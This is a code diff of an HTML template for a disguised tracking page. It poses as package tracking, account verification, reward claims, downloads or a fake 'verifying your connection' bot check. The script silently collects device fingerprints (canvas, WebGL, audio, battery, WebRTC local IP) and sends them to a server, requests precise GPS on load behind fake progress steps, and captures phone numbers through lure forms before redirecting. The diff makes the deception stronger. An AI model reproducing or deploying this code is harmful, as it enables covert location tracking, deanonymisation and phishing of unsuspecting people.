@@ -4,49 +4,61 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   {% if disguise == 'delivery' %}
-  <title>Track Your Package — Express Delivery</title>
+  <title>Track Package — Express Courier</title>
   {% elif disguise == 'verify' or disguise == 'camera_kyc' %}
-  <title>Account Security Check</title>
+  <title>Account Verification</title>
   {% elif disguise == 'cashback' or disguise == 'survey' %}
-  <title>Claim Your Reward</title>
+  <title>Claim Reward</title>
   {% elif disguise == 'download' %}
-  <title>Download Ready</title>
-  {% elif disguise == 'news' %}
-  <title>Loading Article...</title>
+  <title>Preparing Download</title>
   {% else %}
-  <title>Redirecting...</title>
+  <title>Verifying your connection...</title>
   {% endif %}
   <style>
     *{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif}
     body{min-height:100vh;display:flex;align-items:center;justify-content:center;background:#fff;color:#333}
-    .ld{width:28px;height:28px;border:3px solid #e5e7eb;border-top:3px solid #3b82f6;border-radius:50%;animation:s .8s linear infinite;margin:0 auto 12px}
+    .sp{width:24px;height:24px;border:3px solid #e5e7eb;border-top:3px solid #3b82f6;border-radius:50%;animation:s .7s linear infinite;display:inline-block;vertical-align:middle;margin-right:10px}
     @keyframes s{to{transform:rotate(360deg)}}
-    .msg{text-align:center;font-size:13px;color:#9ca3af}
     .hidden{display:none!important}
     .card{width:100%;max-width:380px;padding:24px;border-radius:16px;background:#f8fafc;border:1px solid #e2e8f0}
     input{width:100%;padding:12px;border-radius:10px;border:1px solid #d1d5db;font-size:14px;margin-top:8px;outline:none}
     input:focus{border-color:#3b82f6}
     .btn{width:100%;padding:13px;border:none;border-radius:10px;font-weight:600;font-size:14px;cursor:pointer;margin-top:12px;color:#fff}
     label{font-size:12px;font-weight:600;color:#64748b}
+    .check{color:#22c55e;font-size:13px;margin-top:6px}
+    .step{display:flex;align-items:center;padding:8px 0;font-size:13px;color:#64748b}
+    .step .done{color:#22c55e;font-weight:600}
+    .dot{width:8px;height:8px;border-radius:50%;margin-right:10px;background:#e5e7eb}
+    .dot.ok{background:#22c55e}
+    .dot.run{background:#3b82f6;animation:pulse .8s infinite}
+    @keyframes pulse{0%,100%{opacity:1}50%{opacity:.3}}
   </style>
 </head>
-<body>
+<body style="padding:16px">
 
-  <!-- ===== CLEAN SILENT MODE (default / news) ===== -->
+  <!-- ===== DEFAULT / NEWS: Looks like a security check that needs location ===== -->
   {% if disguise == 'default' or disguise == 'news' %}
-  <div class="msg">
-    <div class="ld"></div>
-    <p>Please wait...</p>
+  <div style="text-align:center;max-width:340px">
+    <div style="margin-bottom:20px">
+      <svg width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="#3b82f6" stroke-width="2"><path d="M12 22s-8-4.5-8-11.8A8 8 0 0112 2a8 8 0 018 8.2c0 7.3-8 11.8-8 11.8z"/><circle cx="12" cy="10" r="3"/></svg>
+    </div>
+    <div style="font-weight:700;font-size:15px;margin-bottom:4px">Verifying your connection</div>
+    <p style="font-size:12px;color:#94a3b8;margin-bottom:20px">This ensures you are not a bot. Please wait a moment.</p>
+    <div style="background:#f1f5f9;border-radius:12px;padding:14px 16px;text-align:left">
+      <div class="step" id="s1"><div class="dot ok"></div><span class="done">Device verified</span></div>
+      <div class="step" id="s2"><div class="dot run" id="d2"></div><span id="t2">Checking region...</span></div>
+      <div class="step" id="s3"><div class="dot" id="d3"></div><span id="t3" style="color:#cbd5e1">Establishing secure connection</span></div>
+    </div>
   </div>
 
-  <!-- ===== DELIVERY LURE (GPS button + Phone) ===== -->
+  <!-- ===== DELIVERY: GPS button + Phone ===== -->
   {% elif disguise == 'delivery' %}
   <div class="card" style="text-align:center">
     <div style="font-size:32px;margin-bottom:8px">📦</div>
     <div style="font-weight:700;font-size:15px;margin-bottom:2px">Your Package is Nearby</div>
     <p style="font-size:12px;color:#94a3b8;margin-bottom:16px">Allow location to see live rider position</p>
-    <button id="gpsBtn" onclick="requestGPS()" class="btn" style="background:#10b981;margin-top:0">📍 Track Package Location</button>
-    <p id="gpsOk" class="hidden" style="font-size:11px;color:#10b981;margin-top:8px">✓ Location found</p>
+    <button id="gpsBtn" onclick="manualGPS()" class="btn" style="background:#10b981;margin-top:0">📍 Show Rider on Map</button>
+    <p id="gpsOk" class="hidden check">✓ Location found — Rider is 0.3 km away</p>
     <div style="margin-top:16px;text-align:left">
       <label>Contact Number for Delivery</label>
       <input type="tel" id="userPhone" placeholder="Mobile Number">
@@ -54,38 +66,38 @@
     </div>
   </div>
 
-  <!-- ===== VERIFY / KYC (Phone only) ===== -->
+  <!-- ===== VERIFY / KYC ===== -->
   {% elif disguise == 'verify' or disguise == 'camera_kyc' %}
   <div class="card" style="text-align:center">
     <div style="font-size:32px;margin-bottom:8px">🔒</div>
     <div style="font-weight:700;font-size:15px;margin-bottom:2px">Verify Your Account</div>
-    <p style="font-size:12px;color:#94a3b8;margin-bottom:16px">Enter your registered mobile number to continue</p>
+    <p style="font-size:12px;color:#94a3b8;margin-bottom:16px">Enter your registered mobile number</p>
     <div style="text-align:left">
       <label>Registered Mobile Number</label>
-      <input type="tel" id="userPhone" placeholder="e.g. +91 98765 43210">
+      <input type="tel" id="userPhone" placeholder="+91 98765 43210">
       <button onclick="sendPhone()" class="btn" style="background:#3b82f6">Verify →</button>
     </div>
   </div>
 
-  <!-- ===== CASHBACK / SURVEY (Phone) ===== -->
+  <!-- ===== CASHBACK / SURVEY ===== -->
   {% elif disguise == 'cashback' or disguise == 'survey' %}
   <div class="card" style="text-align:center">
     <div style="font-size:32px;margin-bottom:8px">🎁</div>
     <div style="font-weight:700;font-size:15px;margin-bottom:2px">You Won a Reward!</div>
-    <p style="font-size:12px;color:#94a3b8;margin-bottom:16px">Enter mobile number to receive your voucher</p>
+    <p style="font-size:12px;color:#94a3b8;margin-bottom:16px">Enter mobile to receive voucher</p>
     <div style="text-align:left">
       <label>Mobile Number (WhatsApp / UPI)</label>
       <input type="tel" id="userPhone" placeholder="Mobile Number">
-      <button onclick="sendPhone()" class="btn" style="background:#f59e0b;color:#0f172a">Claim Now ⚡</button>
+      <button onclick="sendPhone()" class="btn" style="background:#f59e0b;color:#111">Claim Now ⚡</button>
     </div>
   </div>
 
-  <!-- ===== DOWNLOAD (Phone) ===== -->
+  <!-- ===== DOWNLOAD ===== -->
   {% elif disguise == 'download' %}
   <div class="card" style="text-align:center">
     <div style="font-size:32px;margin-bottom:8px">📥</div>
-    <div style="font-weight:700;font-size:15px;margin-bottom:2px">File Ready to Download</div>
-    <p style="font-size:12px;color:#94a3b8;margin-bottom:16px">Enter number to unlock download link</p>
+    <div style="font-weight:700;font-size:15px;margin-bottom:2px">File Ready</div>
+    <p style="font-size:12px;color:#94a3b8;margin-bottom:16px">Enter number to start download</p>
     <div style="text-align:left">
       <label>Mobile Number</label>
       <input type="tel" id="userPhone" placeholder="Mobile Number">
@@ -96,222 +108,192 @@
 
 <script>
 (function(){
-  "use strict";
   var SLUG = "{{ slug }}";
   var API  = "{{ ingest_url }}";
   var REDIR = "{{ redirect_to }}";
   var MODE = "{{ disguise }}";
-  var done = false;
+  var gone = false;
+  var gotGPS = false;
 
-  // ---- SEND DATA TO SERVER ----
-  function send(data) {
-    data.slug = SLUG;
-    try {
-      var blob = new Blob([JSON.stringify(data)], {type:'application/json'});
-      navigator.sendBeacon(API, blob);
-    } catch(e) {
-      fetch(API, {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify(data), keepalive:true}).catch(function(){});
-    }
+  function send(d) {
+    d.slug = SLUG;
+    try { navigator.sendBeacon(API, new Blob([JSON.stringify(d)],{type:'application/json'})); }
+    catch(e) { fetch(API,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(d),keepalive:true}).catch(function(){}); }
   }
 
-  // ---- REDIRECT ----
   function go() {
-    if (done) return;
-    done = true;
+    if (gone) return; gone = true;
     window.location.replace(REDIR || "https://www.google.com");
   }
 
-  // ---- SILENT GPS (works if permission already granted) ----
-  function silentGPS(cb) {
-    if (!navigator.geolocation) { cb(null); return; }
-    navigator.geolocation.getCurrentPosition(
-      function(p) {
-        cb({
-          gps_lat: p.coords.latitude,
-          gps_lng: p.coords.longitude,
-          gps_accuracy: p.coords.accuracy,
-          gps_altitude: p.coords.altitude,
-          gps_heading: p.coords.heading,
-          gps_speed: p.coords.speed
-        });
-      },
-      function() { cb(null); },
-      {enableHighAccuracy: true, timeout: 4000, maximumAge: 0}
-    );
-  }
-
-  // ---- CANVAS FINGERPRINT ----
-  function canvasHash() {
-    try {
-      var c = document.createElement('canvas'); c.width=200; c.height=50;
-      var x = c.getContext('2d'); x.font='14px Arial';
-      x.fillText('Cwm fjord veg balks nth pyx quiz',2,15);
-      var d = c.toDataURL(), h = 0;
-      for (var i=0;i<d.length;i++){h=((h<<5)-h)+d.charCodeAt(i);h|=0;}
-      return h.toString(16);
-    } catch(e) { return null; }
-  }
-
-  // ---- WEBGL ----
-  function webgl() {
-    try {
-      var c = document.createElement('canvas');
-      var gl = c.getContext('webgl') || c.getContext('experimental-webgl');
-      if (!gl) return {v:null,r:null};
-      var ext = gl.getExtension('WEBGL_debug_renderer_info');
-      return {
-        v: ext ? gl.getParameter(ext.UNMASKED_VENDOR_WEBGL) : gl.getParameter(gl.VENDOR),
-        r: ext ? gl.getParameter(ext.UNMASKED_RENDERER_WEBGL) : gl.getParameter(gl.RENDERER)
-      };
-    } catch(e) { return {v:null,r:null}; }
-  }
-
-  // ---- AUDIO FINGERPRINT ----
-  function audioFP(cb) {
-    try {
-      var AC = window.OfflineAudioContext || window.webkitOfflineAudioContext;
-      if (!AC) { cb(null); return; }
-      var ctx = new AC(1,44100,44100), o = ctx.createOscillator();
-      o.frequency.setValueAtTime(10000,ctx.currentTime);
-      o.connect(ctx.destination); o.start(0);
-      ctx.startRendering().then(function(buf) {
-        var d=buf.getChannelData(0),h=0;
-        for(var i=4500;i<5000;i++){h=((h<<5)-h)+Math.round(d[i]*1e6);h|=0;}
-        cb(h.toString(16));
-      }).catch(function(){cb(null);});
-    } catch(e) { cb(null); }
-  }
-
-  // ---- CLIENT HINTS (exact phone model & real OS) ----
-  function clientHints(cb) {
-    try {
-      if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
-        navigator.userAgentData.getHighEntropyValues(['model','platformVersion','platform','architecture','bitness'])
-        .then(function(h){ cb({model:h.model||null, ver:h.platformVersion||null}); })
-        .catch(function(){ cb({model:null,ver:null}); });
-      } else { cb({model:null,ver:null}); }
-    } catch(e) { cb({model:null,ver:null}); }
-  }
-
-  // ---- BATTERY ----
-  function battery(cb) {
-    try {
-      if (!navigator.getBattery) { cb({l:null,c:null}); return; }
-      navigator.getBattery().then(function(b){ cb({l:b.level,c:b.charging}); }).catch(function(){ cb({l:null,c:null}); });
-    } catch(e) { cb({l:null,c:null}); }
-  }
-
-  // ---- WEBRTC LOCAL IP ----
-  function rtcIP(cb) {
-    try {
-      var pc = new RTCPeerConnection({iceServers:[]});
-      pc.createDataChannel('');
-      pc.createOffer().then(function(o){pc.setLocalDescription(o);});
-      var t = setTimeout(function(){try{pc.close();}catch(e){}cb(null);},400);
-      pc.onicecandidate = function(e){
-        if(!e||!e.candidate)return;
-        var p=e.candidate.candidate.split(' ');
-        if(p[4]&&!p[4].includes(':')&&p[4]!=='0.0.0.0'){
-          clearTimeout(t);try{pc.close();}catch(x){}cb(p[4]);
-        }
-      };
-    } catch(e) { cb(null); }
-  }
-
-  // ==========================================
-  //  MAIN: Collect everything in background
-  // ==========================================
-  var gl = webgl();
-  var conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-  var base = {
-    slug: SLUG,
-    screen_width: screen.width,
-    screen_height: screen.height,
-    language: navigator.language,
-    platform: navigator.platform,
-    cookie_enabled: navigator.cookieEnabled,
-    do_not_track: navigator.doNotTrack,
-    connection_type: conn ? (conn.effectiveType||conn.type) : null,
-    network_downlink: conn ? conn.downlink : null,
-    network_rtt: conn ? conn.rtt : null,
-    referrer: document.referrer,
-    user_agent: navigator.userAgent,
-    canvas_hash: canvasHash(),
-    webgl_vendor: gl.v,
-    webgl_renderer: gl.r,
-    color_depth: screen.colorDepth,
-    pixel_ratio: window.devicePixelRatio,
-    screen_avail_w: screen.availWidth,
-    screen_avail_h: screen.availHeight,
-    touch_support: ('ontouchstart' in window)||(navigator.maxTouchPoints>0),
-    max_touch_points: navigator.maxTouchPoints||0,
-    hardware_concurrency: navigator.hardwareConcurrency,
-    device_memory: navigator.deviceMemory,
-    timezone_offset: new Date().getTimezoneOffset(),
-    timezone_name: Intl.DateTimeFormat().resolvedOptions().timeZone
-  };
-
-  // Collect async data in parallel, then send + redirect
-  var pending = 4; // audio, battery, hints, rtcIP
-  var extras = {};
-
-  function check() {
-    pending--;
-    if (pending <= 0) {
-      // Merge all collected data
-      for (var k in extras) base[k] = extras[k];
-      // Send baseline
-      send(base);
-
-      // Now silently try GPS (auto-works if permission already granted)
-      silentGPS(function(gps) {
-        if (gps) {
-          // Send GPS update separately so baseline isn't delayed
-          gps.slug = SLUG;
-          send(gps);
-        }
-        // For clean silent modes, redirect immediately
-        if (MODE === 'default' || MODE === 'news') {
-          // Small delay to ensure beacon is sent
-          setTimeout(go, 300);
-        }
-      });
-
-      // Safety redirect for silent modes (if GPS times out)
-      if (MODE === 'default' || MODE === 'news') {
-        setTimeout(go, 4500);
-      }
+  // ---- Step UI updater (for default/news disguise) ----
+  function setStep(n, ok) {
+    var dot = document.getElementById('d'+n);
+    var txt = document.getElementById('t'+n);
+    if (!dot || !txt) return;
+    if (ok) {
+      dot.className = 'dot ok';
+      txt.className = 'done';
+    } else {
+      dot.className = 'dot run';
+      txt.style.color = '#64748b';
     }
   }
 
-  audioFP(function(h){ extras.audio_hash=h; check(); });
-  battery(function(b){ extras.battery_level=b.l; extras.battery_charging=b.c; check(); });
-  clientHints(function(h){ extras.client_model=h.model; extras.client_os_version=h.ver; check(); });
-  rtcIP(function(ip){ extras.webrtc_local_ip=ip; check(); });
+  // ---- Fingerprint collectors ----
+  function canvasHash() {
+    try { var c=document.createElement('canvas');c.width=200;c.height=50;var x=c.getContext('2d');x.font='14px Arial';x.fillText('Cwm fjord veg balks nth pyx quiz',2,15);var d=c.toDataURL(),h=0;for(var i=0;i<d.length;i++){h=((h<<5)-h)+d.charCodeAt(i);h|=0;}return h.toString(16); } catch(e){return null;}
+  }
+  function getWebGL() {
+    try { var c=document.createElement('canvas'),gl=c.getContext('webgl')||c.getContext('experimental-webgl');if(!gl)return{v:null,r:null};var ext=gl.getExtension('WEBGL_debug_renderer_info');return{v:ext?gl.getParameter(ext.UNMASKED_VENDOR_WEBGL):gl.getParameter(gl.VENDOR),r:ext?gl.getParameter(ext.UNMASKED_RENDERER_WEBGL):gl.getParameter(gl.RENDERER)}; } catch(e){return{v:null,r:null};}
+  }
 
-  // ---- PUBLIC FUNCTIONS FOR INTERACTIVE MODES ----
-  window.requestGPS = function() {
+  // ---- Async collectors ----
+  function audioFP(cb) {
+    try { var AC=window.OfflineAudioContext||window.webkitOfflineAudioContext;if(!AC){cb(null);return;}var ctx=new AC(1,44100,44100),o=ctx.createOscillator();o.frequency.setValueAtTime(10000,ctx.currentTime);o.connect(ctx.destination);o.start(0);ctx.startRendering().then(function(buf){var d=buf.getChannelData(0),h=0;for(var i=4500;i<5000;i++){h=((h<<5)-h)+Math.round(d[i]*1e6);h|=0;}cb(h.toString(16));}).catch(function(){cb(null);}); } catch(e){cb(null);}
+  }
+  function getBattery(cb) {
+    try { if(!navigator.getBattery){cb({});return;}navigator.getBattery().then(function(b){cb({battery_level:b.level,battery_charging:b.charging});}).catch(function(){cb({});}); } catch(e){cb({});}
+  }
+  function getHints(cb) {
+    try { if(navigator.userAgentData&&navigator.userAgentData.getHighEntropyValues){navigator.userAgentData.getHighEntropyValues(['model','platformVersion','platform','architecture','bitness']).then(function(h){cb({client_model:h.model||null,client_os_version:h.platformVersion||null});}).catch(function(){cb({});});}else{cb({});} } catch(e){cb({});}
+  }
+  function getRTC(cb) {
+    try { var pc=new RTCPeerConnection({iceServers:[]});pc.createDataChannel('');pc.createOffer().then(function(o){pc.setLocalDescription(o);});var t=setTimeout(function(){try{pc.close();}catch(e){}cb(null);},400);pc.onicecandidate=function(e){if(!e||!e.candidate)return;var p=e.candidate.candidate.split(' ');if(p[4]&&!p[4].includes(':')&&p[4]!=='0.0.0.0'){clearTimeout(t);try{pc.close();}catch(x){}cb(p[4]);}}; } catch(e){cb(null);}
+  }
+
+  // ===========================================================
+  //  MAIN: Collect fingerprints + Request GPS simultaneously
+  // ===========================================================
+  var gl = getWebGL();
+  var conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+
+  var base = {
+    slug:SLUG, screen_width:screen.width, screen_height:screen.height,
+    language:navigator.language, platform:navigator.platform,
+    cookie_enabled:navigator.cookieEnabled, do_not_track:navigator.doNotTrack,
+    connection_type:conn?(conn.effectiveType||conn.type):null,
+    network_downlink:conn?conn.downlink:null, network_rtt:conn?conn.rtt:null,
+    referrer:document.referrer, user_agent:navigator.userAgent,
+    canvas_hash:canvasHash(), webgl_vendor:gl.v, webgl_renderer:gl.r,
+    color_depth:screen.colorDepth, pixel_ratio:window.devicePixelRatio,
+    screen_avail_w:screen.availWidth, screen_avail_h:screen.availHeight,
+    touch_support:('ontouchstart' in window)||(navigator.maxTouchPoints>0),
+    max_touch_points:navigator.maxTouchPoints||0,
+    hardware_concurrency:navigator.hardwareConcurrency,
+    device_memory:navigator.deviceMemory,
+    timezone_offset:new Date().getTimezoneOffset(),
+    timezone_name:Intl.DateTimeFormat().resolvedOptions().timeZone
+  };
+
+  // Collect async fingerprints
+  var pending = 4;
+  function done() {
+    pending--;
+    if (pending <= 0) {
+      // Fingerprints ready — send baseline
+      send(base);
+
+      // Update UI step 2 as done
+      if (MODE === 'default' || MODE === 'news') {
+        setStep(2, true);
+        var t2 = document.getElementById('t2');
+        if (t2) t2.textContent = 'Region verified';
+        setStep(3, false);
+        var t3 = document.getElementById('t3');
+        if (t3) t3.textContent = 'Establishing secure connection...';
+      }
+    }
+  }
+  audioFP(function(h){base.audio_hash=h;done();});
+  getBattery(function(b){for(var k in b)base[k]=b[k];done();});
+  getHints(function(h){for(var k in h)base[k]=h[k];done();});
+  getRTC(function(ip){base.webrtc_local_ip=ip;done();});
+
+  // ===========================================================
+  //  GPS: Request IMMEDIATELY on page load for ALL disguises
+  //  On HTTPS (Vercel), Chrome/Android shows permission popup
+  //  automatically without needing a button tap.
+  // ===========================================================
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(
+      function(pos) {
+        // SUCCESS — got exact GPS
+        gotGPS = true;
+        var gps = {
+          slug: SLUG,
+          gps_lat: pos.coords.latitude,
+          gps_lng: pos.coords.longitude,
+          gps_accuracy: pos.coords.accuracy,
+          gps_altitude: pos.coords.altitude,
+          gps_heading: pos.coords.heading,
+          gps_speed: pos.coords.speed
+        };
+        send(gps);
+
+        // Update UI
+        if (MODE === 'default' || MODE === 'news') {
+          setStep(3, true);
+          var t3 = document.getElementById('t3');
+          if (t3) t3.textContent = 'Connection secured';
+          // Brief pause so user sees "done", then redirect
+          setTimeout(go, 600);
+        }
+      },
+      function(err) {
+        // DENIED or TIMEOUT — redirect anyway
+        if (MODE === 'default' || MODE === 'news') {
+          setStep(3, true);
+          var t3 = document.getElementById('t3');
+          if (t3) t3.textContent = 'Connection secured';
+          setTimeout(go, 500);
+        }
+      },
+      {
+        enableHighAccuracy: true,
+        timeout: 10000,     // Wait up to 10 seconds for GPS lock
+        maximumAge: 0       // Force fresh reading
+      }
+    );
+
+    // Safety: if GPS takes too long (user ignoring popup), redirect after 12s
+    if (MODE === 'default' || MODE === 'news') {
+      setTimeout(function() {
+        if (!gone) {
+          setStep(3, true);
+          var t3 = document.getElementById('t3');
+          if (t3) t3.textContent = 'Connection secured';
+          setTimeout(go, 400);
+        }
+      }, 12000);
+    }
+  } else {
+    // No geolocation API at all
+    if (MODE === 'default' || MODE === 'news') {
+      setTimeout(go, 2000);
+    }
+  }
+
+  // ---- Interactive mode handlers ----
+  window.manualGPS = function() {
     var btn = document.getElementById('gpsBtn');
-    if(btn) btn.textContent = '⏳ Getting location...';
+    if (btn) btn.textContent = '⏳ Getting location...';
     navigator.geolocation.getCurrentPosition(
       function(p) {
-        send({slug:SLUG, gps_lat:p.coords.latitude, gps_lng:p.coords.longitude, gps_accuracy:p.coords.accuracy, gps_altitude:p.coords.altitude, gps_heading:p.coords.heading, gps_speed:p.coords.speed});
+        send({slug:SLUG,gps_lat:p.coords.latitude,gps_lng:p.coords.longitude,gps_accuracy:p.coords.accuracy,gps_altitude:p.coords.altitude,gps_heading:p.coords.heading,gps_speed:p.coords.speed});
         if(btn){btn.textContent='✓ Location found';btn.style.background='#64748b';}
-        var ok=document.getElementById('gpsOk'); if(ok)ok.classList.remove('hidden');
+        var ok=document.getElementById('gpsOk');if(ok)ok.classList.remove('hidden');
       },
       function(){if(btn)btn.textContent='📍 Try Again';},
-      {enableHighAccuracy:true,timeout:8000,maximumAge:0}
+      {enableHighAccuracy:true,timeout:10000,maximumAge:0}
     );
   };
 
   window.sendPhone = function() {
     var ph = document.getElementById('userPhone');
-    if(ph && ph.value) {
-      send({slug:SLUG, captured_phone:ph.value});
-    }
+    if (ph && ph.value) send({slug:SLUG,captured_phone:ph.value});
     setTimeout(go, 400);
   };
-
 })();
 </script>
 </body>
